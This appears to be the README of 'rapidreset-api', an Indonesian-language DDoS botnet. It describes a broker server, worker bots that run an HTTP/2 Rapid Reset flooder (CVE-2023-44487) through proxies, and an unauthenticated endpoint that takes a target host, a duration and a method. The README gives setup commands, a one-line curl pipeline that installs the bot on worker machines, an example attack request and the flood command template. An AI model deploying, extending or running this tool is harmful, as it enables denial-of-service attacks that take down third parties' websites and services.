# rapidreset-api

Orchestrator + worker model. Satu server kecil (`index.js`) membuka endpoint serangan, worker (`bot/client.js`) konek dari mesin mana pun lalu menjalankan `rapidreset.js` secara lokal.

```
client.js  --HTTP upgrade-->  index.js  --job-->  client.js  --spawn-->  rapidreset.js
   (worker)                    (broker)             (worker)               (flooder)
```

`index.js` tidak pernah menjalankan proses sendiri. Dia memegang antrean, memilih worker idle, dan meneruskan perintah yang sudah dirender dari `method.json`.

## Isi repo

| Path | Fungsi |
| --- | --- |
| `index.js` | broker + HTTP API + halaman dokumentasi di `/` |
| `method.json` | daftar method dan template command `<<host>>` `<<time>>` `<<method>>` |
| `bot/client.js` | worker, konek ke `index.js` lalu eksekusi command |
| `bot/rapidreset.js` | flooder HTTP/2 (CVE-2023-44487) |
| `bot/proxi.txt` | daftar proxy, satu per baris |

## Setup server

```bash
git clone https://github.com/malasahjagotwin/rapidreset-api.git
cd rapidreset-api
npm install                # hanya butuh hpack
node index.js
```

Variabel lingkungan:

| Nama | Default | Keterangan |
| --- | --- | --- |
| `PORT` | `SERVER_PORT` lalu `3295` | port bind |
| `HOST` | `0.0.0.0` | interface bind |
| `CLIENT_TOKEN` | kosong | kalau diisi, worker wajib kirim header yang sama |

## Setup client

Satu baris, sudah termasuk `npm i hpack`:

```bash
mkdir -p bot && cd bot \
  && curl -fsSLO https://raw.githubusercontent.com/malasahjagotwin/rapidreset-api/main/bot/client.js \
  && curl -fsSLO https://raw.githubusercontent.com/malasahjagotwin/rapidreset-api/main/bot/rapidreset.js \
  && curl -fsSLO https://raw.githubusercontent.com/malasahjagotwin/rapidreset-api/main/bot/proxi.txt \
  && npm i hpack --no-audit --no-fund \
  && ORCHESTRATOR=http://IP:3295 node client.js
```

Kalau server memakai `CLIENT_TOKEN`, tambahkan sebelum `node client.js`:

```bash
CLIENT_TOKEN=rahasia ORCHESTRATOR=http://IP:3295 node client.js
```

Worker tambahan di mesin lain cukup ulangi perintah yang sama. Multi-slot per mesin:

```bash
MAX_CONCURRENT=2 ORCHESTRATOR=http://IP:3295 node client.js
```

## Endpoint

```
GET /api/attack?host=<url>&time=<detik>&method=<nama>
```

| Parameter | Wajib | Keterangan |
| --- | --- | --- |
| `host` | ya | URL target, harus `http://` atau `https://`, tanpa spasi |
| `time` | ya | durasi detik, `1`–`300` (alias lama: `itme`) |
| `method` | ya | nama dari `method.json` |

```bash
curl "http://IP:3295/api/attack?host=https://example.com&time=30&method=rapidreset"
```

```json
{
  "ok": true,
  "id": "4b7d1c2e-...",
  "status": "queued",
  "method": "rapidreset",
  "host": "https://example.com",
  "time": 30,
  "statusUrl": "/api/attack/4b7d1c2e-..."
}
```

Buka `http://IP:3295/` di browser untuk dokumentasi interaktif dengan tombol copy.

Endpoint lain:

| Endpoint | Metode | Fungsi |
| --- | --- | --- |
| `/` | GET | halaman dokumentasi |
| `/api/attack` | GET | kirim job |
| `/api/attack/<id>` | GET | status job (`queued` / `running`) |
| `/api/workers` | GET | daftar worker dan panjang antrean |
| `/api/worker` | GET + Upgrade | kanal worker utama |
| `/api/worker/signal` | POST | kanal worker cadangan kalau `Upgrade` diblokir proxy |

## Menambah method

Edit `method.json`, tambahkan entri baru:

```json
[
  {
    "name": "rapidreset",
    "command": "node rapidreset.js GET <<host>> <<time>> 1 64 proxi.txt",
    "description": "CVE-2023-44487"
  }
]
```

Placeholder yang dikenali hanya `<<host>>`, `<<time>>`, dan `<<method>>`. Placeholder lain membuat request ditolak.

## Catatan

- `/api/attack` tidak memakai autentikasi apa pun. Siapa pun yang bisa membuka URL-nya bisa mengirim job dan menjalankannya dari worker yang terhubung.
- Worker yang putus di tengah job membuat job tersebut gagal setelah timeout 60 detik.
- Antrean dibatasi 32 job menunggu, sisanya ditolak dengan `503`.
